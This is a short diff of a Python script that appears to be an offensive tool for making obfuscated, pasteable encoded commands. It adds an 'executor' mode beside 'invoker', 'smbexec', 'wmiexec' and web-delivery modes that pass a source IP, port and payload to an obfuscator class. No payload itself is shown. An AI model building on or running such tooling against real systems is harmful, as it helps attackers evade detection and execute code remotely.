@@ -248,6 +248,7 @@ Create Pasteable Double Encoded Script:
     mim_func = args.mim_func           # The function that is executed
     mim_arg = args.mim_arg             # The argument processed by the function
     invoker = args.invoker             # Holds the results for invoker execution
+    executor = args.executor           # Holds the results for the executor attack
     downloader = args.downloader       # Holds the results for exploit/multi/script/web_delivery
     smbexec_cmd = args.smbexec_cmd     # Holds the results for smbexec execution
     wmiexec_cmd = args.wmiexec_cmd     # Holds the results for the wmiexec execution
@@ -333,6 +334,10 @@ Create Pasteable Double Encoded Script:
 
     if invoker:
         execution = "invoker"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
+        command, unprotected_command = x.return_command()
+    if executor:
+        execution = "executor"
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
         command, unprotected_command = x.return_command()
     elif downloader:
